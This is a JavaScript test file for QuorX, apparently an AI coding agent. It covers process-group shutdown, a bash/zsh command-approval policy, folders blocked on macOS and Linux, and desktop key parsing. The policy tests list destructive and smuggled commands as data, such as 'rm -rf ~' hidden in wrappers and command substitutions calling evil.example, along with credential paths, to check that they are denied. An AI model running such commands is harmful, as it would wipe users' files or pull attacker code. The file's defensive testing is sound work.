// Tests for QuorX on macOS and Linux: Stop through process groups, the bash and zsh rules, the folders that are off
// limits there, and the desktop tool's keys and text. The logic is tested on any computer (a fake process table, POSIX
// paths passed in); the tests that start real processes run only on macOS and Linux.
import './test-home.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawn, execFileSync } from 'node:child_process';
import { processGroups, parseProcStat, parsePs } from '../server/procgroup.js';
import { decide, posixSystemZone } from '../server/cmdpolicy.js';
import { parseSendKeys, macKeyEvents, treeText, roleName, MAC_KEYCODES } from '../server/deskkit.js';
import { safetySettings } from '../server/safety.js';

const POSIX = process.platform !== 'win32';
const tmp = (name) => fs.mkdtempSync(path.join(os.tmpdir(), `qx-${name}-`));

// ---------- process groups, with a fake process table ----------
// Each process: { pid, ppid, pgid, comm, stubborn (ignores SIGTERM), zombie }. kill() follows POSIX: a negative pid
// is a whole group; SIGTERM ends what isn't stubborn, SIGKILL ends everything.
function fakeSystem(procs) {
  const table = new Map(procs.map((p) => [p.pid, { ...p }]));
  const signals = [];
  const end = (p, sig) => { if (sig === 'SIGKILL' || !p.stubborn) table.delete(p.pid); };
  return {
    table, signals,
    list: async () => [...table.values()].map((p) => ({ pid: p.pid, ppid: p.ppid, pgid: p.pgid, comm: p.comm, zombie: !!p.zombie })),
    kill: (pid, sig) => {
      signals.push([pid, sig]);
      const hit = pid < 0 ? [...table.values()].filter((p) => p.pgid === -pid) : [table.get(pid)].filter(Boolean);
      if (!hit.length) { const e = new Error('ESRCH'); e.code = 'ESRCH'; throw e; }
      for (const p of hit) end(p, sig);
    },
  };
}
const QUORX = 100;
const base = () => [{ pid: 1, ppid: 0, pgid: 1, comm: 'launchd' }, { pid: QUORX, ppid: 1, pgid: QUORX, comm: 'node' }, { pid: 900, ppid: 1, pgid: 900, comm: 'Safari' }];

test('groups: Stop ends the whole group with SIGTERM and confirms 0 left', async () => {
  const sys = fakeSystem([...base(), { pid: 200, ppid: QUORX, pgid: 200, comm: 'node' }, { pid: 201, ppid: 200, pgid: 200, comm: 'bash' }, { pid: 202, ppid: 201, pgid: 200, comm: 'sleep' }]);
  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 50, pollMs: 5 });
  G.adopt('j1', 200);
  assert.deepEqual((await G.count('j1')).names.sort(), ['bash', 'node', 'sleep']);
  const r = await G.kill('j1', 200);
  assert.equal(r.left, 0);
  assert.ok(sys.signals.some(([pid, sig]) => pid === -200 && sig === 'SIGTERM'), 'the group got SIGTERM');
  assert.ok(!sys.signals.some(([, sig]) => sig === 'SIGKILL'), 'no SIGKILL was needed');
  assert.ok(sys.table.has(900) && sys.table.has(QUORX), 'other programs and QuorX itself are untouched');
});

test('groups: what ignores SIGTERM gets SIGKILL after the grace time', async () => {
  const sys = fakeSystem([...base(), { pid: 300, ppid: QUORX, pgid: 300, comm: 'node' }, { pid: 301, ppid: 300, pgid: 300, comm: 'server', stubborn: true }]);
  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
  G.adopt('j', 300);
  const r = await G.kill('j', 200);
  assert.equal(r.left, 0);
  assert.ok(sys.signals.some(([pid, sig]) => pid === 301 && sig === 'SIGKILL'));
});

test('groups: a daemon that left the group is still the job’s (as a child, or seen before)', async () => {
  const sys = fakeSystem([...base(), { pid: 400, ppid: QUORX, pgid: 400, comm: 'node' }, { pid: 401, ppid: 400, pgid: 400, comm: 'bash' }]);
  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
  G.adopt('j', 400);
  // A child that calls setsid: a new group, but its parent is in the job.
  sys.table.set(402, { pid: 402, ppid: 401, pgid: 402, comm: 'daemon' });
  assert.ok((await G.count('j')).pids.includes(402), 'found as a child');
  // Its parent exits and it is handed to launchd: it was seen in the job, so it still counts.
  sys.table.delete(401); sys.table.get(402).ppid = 1;
  assert.ok((await G.count('j')).pids.includes(402), 'remembered after it was orphaned');
  const r = await G.kill('j', 200);
  assert.equal(r.left, 0);
  assert.ok(!sys.table.has(402));
});

test('groups: a reused pid with another name, zombies and QuorX itself are never counted', async () => {
  const sys = fakeSystem([...base(), { pid: 500, ppid: QUORX, pgid: 500, comm: 'node' }, { pid: 501, ppid: 500, pgid: 500, comm: 'cc' }]);
  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
  G.adopt('j', 500);
  await G.count('j');
  sys.table.delete(501);
  sys.table.set(501, { pid: 501, ppid: 1, pgid: 501, comm: 'Mail' }); // the pid came back as your mail app
  sys.table.set(503, { pid: 503, ppid: 500, pgid: 500, comm: 'ld', zombie: true });
  const c = await G.count('j');
  assert.deepEqual(c.names, ['node']);
  await G.kill('j', 200);
  assert.ok(sys.table.has(501), 'your Mail is never touched');
});

test('groups: QuorX exiting kills every group at once', () => {
  const sys = fakeSystem([...base(), { pid: 600, ppid: QUORX, pgid: 600, comm: 'node' }, { pid: 601, ppid: 600, pgid: 600, comm: 'vite' }]);
  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX });
  G.adopt('j', 600);
  G.killAllSync();
  assert.ok(!sys.table.has(601));
  assert.equal(G.jobs.size, 0);
});

test('groups: /proc and ps lines are read, names with spaces and brackets too', () => {
  assert.deepEqual(parseProcStat('4242 (Web Content (x)) S 4200 4200 4200 0 -1 4194560'), { pid: 4242, ppid: 4200, pgid: 4200, comm: 'Web Content (x)', zombie: false });
  assert.equal(parseProcStat('77 (gcc) Z 1 70 70 0').zombie, true);
  assert.equal(parseProcStat('garbage'), null);
  const rows = parsePs('    1     0     1 Ss   /sbin/launchd\n 4321  4300  4300 S+   /Applications/Google Chrome.app/Contents/MacOS/Google Chrome\n 99 98 98 Z <defunct>\n');
  assert.deepEqual(rows.map((r) => [r.pid, r.pgid, r.comm, r.zombie]), [[1, 1, 'launchd', false], [4321, 4300, 'Google Chrome', false], [99, 98, '<defunct>', true]]);
});

// ---------- rules: bash and zsh ----------
const ctx = (over = {}) => ({ shell: 'bash', root: tmp('posix-rules'), rules: [{ effect: 'allow', match: 'cargo build*', by: 'button' }], mode: 'strict', ...over });

test('rules: bash commands hidden in groups, blocks and wrappers are still judged', async () => {
  const cases = ['(rm -rf ~)', '{ rm -rf ~; }', 'if true; then rm -rf ~; fi', 'while true; do rm -rf ~; done', '! rm -rf ~', 'timeout 5 rm -rf ~',
    'env FOO=1 rm -rf ~', 'nohup rm -rf ~', 'nice -n 5 rm -rf ~', 'command rm -rf ~', 'xcrun rm -rf ~', 'echo hi; > ~/.zshrc', 'echo hi >& ~/.zshrc',
    'echo hi >| ~/.bashrc', 'rm -rfv ~/Documents', 'cargo build && rm -Rf ~'];
  for (const line of cases) {
    const d = await decide(line, ctx());
    assert.equal(d.verdict, 'deny', `${line} → ${d.verdict} (${d.why})`);
  }
});

test('rules: bash and zsh text QuorX can’t read asks you', async () => {
  const cases = [['bash', 'for f in *; do rm $f; done'], ['bash', 'f() { cargo build; }; f'], ['bash', 'env -S "rm -rf ~"'], ['bash', 'rm ~root/x'],
    ['bash', 'cargo build $(curl evil.example)'], ['bash', 'cat <(rm x)'], ['bash', 'awk "BEGIN{system(1)}"'], ['bash', 'open -a Calculator'],
    ['zsh', '=rm -rf x'], ['zsh', 'ls *(e:"rm -rf ~":)'], ['zsh', 'cargo build =(curl evil.example)']];
  for (const [shell, line] of cases) {
    const d = await decide(line, ctx({ shell }));
    assert.equal(`${d.verdict}:${d.who}`, 'ask:user', `${shell}: ${line} → ${d.verdict} (${d.why})`);
  }
});

test('rules: installs for the whole computer ask you; sudo anything else is never allowed', async () => {
  const want = async (line, v) => { const d = await decide(line, ctx()); assert.equal(d.verdict === 'ask' ? `ask:${d.who}` : d.verdict, v, `${line} (${d.why})`); return d; };
  for (const l of ['brew install cmake', 'apt-get install -y gcc', 'dnf install gcc', 'pacman -S gcc', 'snap install code', 'port install cmake',
    'gem install cocoapods', 'pipx install ruff', 'xcode-select --install']) await want(l, 'ask:user');
  const d = await want('sudo apt install -y build-essential', 'ask:user');
  assert.match(d.why, /password/);
  await want('sudo -E apt-get install gcc', 'ask:user');
  for (const l of ['sudo rm -rf /tmp/x', 'sudo ls', 'sudo sh -c "apt install x"', 'launchctl load x.plist', 'systemctl stop nginx', 'crontab -r',
    'security find-generic-password -s x', 'defaults write -g AppleShowAllFiles 1', 'tccutil reset All', 'csrutil disable', 'mkfs.ext4 /dev/sdb1', 'diskutil eraseDisk x']) await want(l, 'deny');
  for (const l of ['brew list', 'brew info cmake', 'apt list --installed', 'pacman -Qi gcc', 'dpkg -L gcc', 'xcode-select -p', 'systemctl status nginx',
    'crontab -l', 'security find-identity -v -p codesigning', 'defaults read com.example.app', 'command -v node', 'xcrun --find clang', 'env', 'uname -a', 'sw_vers']) await want(l, 'allow');
});

test('rules: commands typed for Node\'s default shell are read as bash off Windows', { skip: !POSIX && 'needs macOS or Linux' }, async () => {
  const d = await decide('rm -rf ~', ctx({ shell: 'cmd' }));
  assert.equal(d.shell, 'bash');
  assert.equal(d.verdict, 'deny');
});

test('rules: the agent\'s shell off Windows is bash or zsh, never PowerShell', () => {
  const s = safetySettings({ shell: 'powershell' });
  if (POSIX) { assert.equal(s.shell, 'bash'); assert.equal(safetySettings({ shell: 'zsh' }).shell, 'zsh'); } else assert.equal(s.shell, 'powershell');
});

// ---------- scripts the agent runs (bash on macOS and Linux) ----------
const scriptsAt = (files) => { const dir = tmp('posix-scripts'); for (const [rel, text] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true }); fs.writeFileSync(path.join(dir, rel), text); } return dir; };

test('scripts: a bash wrapper script that runs other programs can’t be checked', async () => {
  const root = scriptsAt({
    'run.sh': '#!/bin/bash\n# runs whatever it is given\n"$@"\n',
    'launch.sh': '#!/bin/bash\nset -e\ncargo build\nopen -a Calculator\n',
    'hidden.sh': '#!/bin/bash\nif true; then\n  timeout 5 bash -c "rm -rf ~/x"\nfi\n',
    'each.sh': '#!/bin/bash\nfind . -name "*.tmp" -exec rm {} \\;\n',
    'build.sh': '#!/bin/bash\nset -e\ncargo build --release\necho done\n',
    'nested.sh': '#!/bin/bash\n./launch.sh\n',
  });
  const d = async (line) => decide(line, { shell: 'bash', root, rules: [], mode: 'strict', yolo: {} });
  for (const line of ['bash run.sh make', './launch.sh', 'sh hidden.sh', 'bash each.sh', './nested.sh']) {
    const r = await d(line);
    assert.equal(`${r.verdict}:${r.who}`, 'ask:user', `${line} → ${r.verdict} (${r.why})`);
    assert.ok(r.segments.some((s) => s.cls === 'opaque' && /runs other programs|can’t read this script/.test(s.why)), `${line}: ${JSON.stringify(r.segments.map((s) => [s.text, s.cls, s.why]))}`);
  }
  const passed = await d('bash run.sh rm -rf ~');
  assert.equal(passed.verdict, 'deny', 'what the wrapper passes on is judged as a command');
  const plain = await d('bash build.sh');
  assert.ok(!plain.segments.some((s) => s.cls === 'opaque'), `a plain build script stays a build: ${JSON.stringify(plain.segments.map((s) => [s.cls, s.why]))}`);
});

test('scripts: system commands inside a bash script show up as commands of their own', async () => {
  const root = scriptsAt({ 'setup.sh': '#!/bin/bash\nbrew install cmake\nsudo launchctl load ~/Library/LaunchAgents/x.plist\n' });
  const r = await decide('./setup.sh', { shell: 'bash', root, rules: [], mode: 'strict', yolo: {} });
  assert.equal(r.verdict, 'deny', r.why);
  assert.ok(r.segments.some((s) => s.program === 'brew' && s.cls === 'install' && s.global), 'the brew install is shown');
  assert.ok(r.segments.some((s) => s.program === 'sudo' && s.cls === 'never'), 'sudo launchctl is refused');
});

test('scripts: package.json scripts are read as sh off Windows', { skip: !POSIX && 'needs macOS or Linux' }, async () => {
  const root = scriptsAt({ 'package.json': JSON.stringify({ scripts: { start: 'open -a Safari http://localhost:3000', build: 'tsc -p . && echo ok', clean: 'rm -rf ~/' } }) });
  const v = async (line) => { const r = await decide(line, { shell: 'bash', root, rules: [], mode: 'strict', yolo: {} }); return r.verdict === 'ask' ? `ask:${r.who}` : r.verdict; };
  assert.equal(await v('npm start'), 'ask:user');
  assert.equal(await v('npm run clean'), 'deny');
  assert.notEqual(await v('npm run build'), 'deny');
});

// ---------- folders that are off limits on macOS and Linux ----------
test('paths: macOS system folders, other profiles and your Library are blocked', () => {
  const at = (p) => posixSystemZone(p, { platform: 'darwin', home: '/Users/me' })?.zone || 'ok';
  for (const p of ['/System/Library/x', '/Library/LaunchDaemons/x.plist', '/Applications/Xcode.app', '/usr/bin/git', '/usr/local/bin/x', '/opt/homebrew/bin/x',
    '/private/etc/hosts', '/etc/hosts', '/Users', '/Users/other/Documents', '/users/OTHER', '/Users/me/Library/Keychains/login.keychain-db',
    '/Users/me/library/LaunchAgents/x.plist', '/Users/me/.ssh/id_ed25519', '/Users/me/.aws/credentials', '/Volumes/Backup']) assert.equal(at(p), 'blocked', p);
  for (const p of ['/Users/me/code/app/x', '/Users/me/Library/Developer/Xcode/DerivedData/App-abc', '/Users/me/Library/Caches/x', '/Users/Shared/x',
    '/private/var/folders/ab/T/x', '/private/tmp/x', '/Volumes/Backup/projects/app']) assert.equal(at(p), 'ok', p);
});

test('paths: Linux system folders, other profiles and drives are blocked', () => {
  const at = (p) => posixSystemZone(p, { platform: 'linux', home: '/home/me' })?.zone || 'ok';
  for (const p of ['/etc/passwd', '/usr/lib/x', '/boot/vmlinuz', '/var/lib/dpkg', '/root/.bashrc', '/home', '/home/other/x', '/proc/1/mem', '/dev/sda',
    '/mnt/c', '/media/me/USB', '/home/me/.ssh/authorized_keys', '/home/me/.config/autostart/x.desktop', '/home/me/.local/bin/python']) assert.equal(at(p), 'blocked', p);
  for (const p of ['/home/me/code/app', '/tmp/x', '/var/tmp/x', '/mnt/c/projects/app', '/media/me/USB/app', '/home/me/.config/Code/x', '/Home/other']) assert.equal(at(p), 'ok', p);
  assert.equal(posixSystemZone('/home/me/x', { platform: 'linux', home: '/root' })?.zone, 'blocked', 'other profiles are blocked for root too');
});

test('paths: a real delete in a blocked macOS or Linux folder is refused', { skip: !POSIX && 'needs macOS or Linux' }, async () => {
  for (const line of ['rm -rf /etc/x', 'rm ~/.ssh/known_hosts', `rm -f ${process.platform === 'darwin' ? '/Library/x' : '/usr/lib/x'}`]) {
    const d = await decide(line, ctx());
    assert.equal(d.verdict, 'deny', `${line} (${d.why})`);
  }
});

// ---------- the desktop tool's keys and text ----------
test('desktop: SendKeys text becomes key presses; ^ is Command on macOS', () => {
  assert.deepEqual(parseSendKeys('hello{ENTER}'), [{ text: 'hello' }, { key: 'return', mods: [] }]);
  assert.deepEqual(parseSendKeys('^s'), [{ key: 's', mods: ['ctrl'] }]);
  assert.deepEqual(parseSendKeys('%{F4}'), [{ key: 'f4', mods: ['alt'] }]);
  assert.deepEqual(parseSendKeys('+(ab)'), [{ key: 'a', mods: ['shift'] }, { key: 'b', mods: ['shift'] }]);
  assert.deepEqual(parseSendKeys('{TAB 3}x~'), [{ key: 'tab', mods: [] }, { key: 'tab', mods: [] }, { key: 'tab', mods: [] }, { text: 'x' }, { key: 'return', mods: [] }]);
  assert.deepEqual(parseSendKeys('a{+}b{}}'), [{ text: 'a+b}' }]);
  assert.deepEqual(macKeyEvents('^q'), [{ code: MAC_KEYCODES.q, mods: ['cmd'] }]);
  assert.deepEqual(macKeyEvents('Hi{ESC}'), [{ text: 'Hi' }, { code: 53, mods: [] }]);
  assert.throws(() => parseSendKeys('{NOPE}'), /unknown key/);
  assert.throws(() => macKeyEvents('^é'), /can't be pressed/);
});

test('desktop: macOS and Linux controls read as the same numbered text as Windows', () => {
  const nodes = [
    { indent: 0, role: 'AXWindow', name: 'Counter', enabled: true },
    { indent: 1, role: 'AXStaticText', name: 'Count: 3', enabled: true },
    { indent: 1, role: 'AXButton', name: 'Add', enabled: true, ref: 1, x: 40.4, y: 80 },
    { indent: 1, role: 'AXTextField', name: 'Name', value: 'Ada', enabled: true, ref: 2, x: 120, y: 30 },
    { indent: 1, role: 'AXCheckBox', name: 'Dark mode', checked: true, enabled: true, ref: 3, x: 10, y: 10 },
    { indent: 1, role: 'push button', name: 'Reset', enabled: false },
    { indent: 1, role: 'check box', name: 'Hidden', checked: false, offscreen: true, ref: 4 },
  ];
  assert.equal(treeText(nodes, { more: true }), [
    'Window "Counter"', '  Text "Count: 3"', '  [1] Button "Add" @40,80', '  [2] Edit "Name" value="Ada" @120,30', '  [3] CheckBox "Dark mode" checked @10,10',
    '  Button "Reset" (disabled)', '  [4] CheckBox "Hidden" unchecked (off screen)', '… (more controls not shown)', ''].join('\n'));
  assert.equal(roleName('AXPopUpButton'), 'ComboBox');
  assert.equal(roleName('AXSplitGroup'), 'SplitGroup');
});

// ---------- real processes (macOS and Linux) ----------
const marker = () => `qx${Math.random().toString(36).slice(2, 8)}`;
// A sleep with a name of its own, so the test sees only its own processes: perl renames itself ($0).
const sleeper = (name, extra = '') => `perl -e '$0="${name}"; ${extra} sleep 600'`;
const hasPerl = (() => { try { execFileSync('perl', ['-v']); return true; } catch { return false; } })();
// Every process whose command line holds the marker: the sleeper, and the shell and gate that started it.
const named = (name) => { try { return execFileSync('ps', ['-A', '-o', 'args='], { encoding: 'utf8' }).split('\n').filter((l) => l.includes(name)).length; } catch { return 0; } };

test('stop: the process-group host is on, off Windows', { skip: !POSIX && 'needs macOS or Linux' }, async () => {
  const { jobsAvailable, jobHostStatus } = await import('../server/jobhost.js');
  assert.equal(await jobsAvailable(), true);
  assert.equal(jobHostStatus().mode, 'groups');
});

test('stop: a background child a command leaves behind is ended and named', { skip: !POSIX ? 'needs macOS or Linux' : !hasPerl && 'needs perl' }, async () => {
  const { runLine } = await import('../server/workspace.js');
  const m = marker();
  const r = await runLine(tmp('sweep'), `${sleeper(m)} & echo started`, { shell: 'bash', timeout: 20000 });
  assert.equal(r.code, 0);
  assert.match(r.out, /started/);
  assert.ok(r.leftovers, 'the leftover is reported');
  assert.equal(r.leftovers.left, 0);
  assert.equal(named(m), 0, 'nothing survives');
});

test('stop: aborting ends the whole group, a setsid daemon too, and confirms 0 left', { skip: !POSIX ? 'needs macOS or Linux' : !hasPerl && 'needs perl' }, async () => {
  const { runLine } = await import('../server/workspace.js');
  const a = marker(), b = marker();
  const ac = new AbortController();
  const p = runLine(tmp('abort'), `${sleeper(a, 'use POSIX; POSIX::setsid();')} & ${sleeper(b)}`, { shell: 'bash', signal: ac.signal, timeout: 30000 });
  await new Promise((r) => setTimeout(r, 1500));
  ac.abort();
  const r = await p;
  assert.ok(r.stopped, 'reported as stopped');
  assert.equal(r.stopped.mode, 'groups');
  assert.equal(r.stopped.left, 0);
  assert.match(r.out, /0 processes left/);
  assert.equal(named(a) + named(b), 0);
});

test('stop: a timeout uses the same kill path', { skip: !POSIX ? 'needs macOS or Linux' : !hasPerl && 'needs perl' }, async () => {
  const { runLine } = await import('../server/workspace.js');
  const m = marker();
  const r = await runLine(tmp('timeout'), sleeper(m), { shell: 'bash', timeout: 1500 });
  assert.equal(r.timedOut, true);
  assert.equal(r.stopped.left, 0);
  assert.equal(named(m), 0);
});

test('stop: if QuorX is killed, the gate ends its own group', { skip: !POSIX ? 'needs macOS or Linux' : !hasPerl && 'needs perl' }, async () => {
  const m = marker();
  const gate = path.resolve('server/jobgate.cjs');
  // A stand-in for QuorX: starts the gate detached (as workspace.js does), says go, then is killed outright.
  const host = spawn(process.execPath, ['-e', `const c = require('child_process').spawn(process.execPath, [${JSON.stringify(gate)}, 'bash', ${JSON.stringify(sleeper(m))}], { detached: true, stdio: ['pipe', 'ignore', 'ignore'] }); c.stdin.end('go\\n'); setInterval(() => {}, 1000);`], { stdio: 'ignore' });
  for (let t = 0; t < 50 && !named(m); t++) await new Promise((r) => setTimeout(r, 100));
  assert.ok(named(m) >= 1, 'the command runs');
  host.kill('SIGKILL');
  for (let t = 0; t < 50 && named(m); t++) await new Promise((r) => setTimeout(r, 100));
  assert.equal(named(m), 0, 'it ended with its gate');
});

test('stop: a stdio debug adapter behind dapbridge ends with the session’s group', { skip: !POSIX ? 'needs macOS or Linux' : !hasPerl && 'needs perl' }, async () => {
  const { runLine } = await import('../server/workspace.js');
  const { stdioLine } = await import('../server/dapbridge.js');
  const m = marker(), ac = new AbortController();
  const p = runLine(tmp('bridge'), stdioLine(47000 + Math.floor(Math.random() * 1000), sleeper(m)), { shell: 'bash', signal: ac.signal, timeout: 30000 });
  for (let t = 0; t < 50 && !named(m); t++) await new Promise((r) => setTimeout(r, 100));
  assert.ok(named(m) >= 1, 'the adapter runs');
  ac.abort();
  const r = await p;
  assert.equal(r.stopped.left, 0);
  assert.equal(named(m), 0, 'the adapter ended with the bridge');
});

test('stop: zsh runs commands when it is installed', { skip: !POSIX ? 'needs macOS or Linux' : !['/bin/zsh', '/usr/bin/zsh'].some((f) => fs.existsSync(f)) && 'zsh is not installed' }, async () => {
  const { runLine } = await import('../server/workspace.js');
  const r = await runLine(tmp('zsh'), 'echo $ZSH_VERSION', { shell: 'zsh', timeout: 10000 });
  assert.equal(r.code, 0);
  assert.match(r.out, /\d+\.\d+/);
});
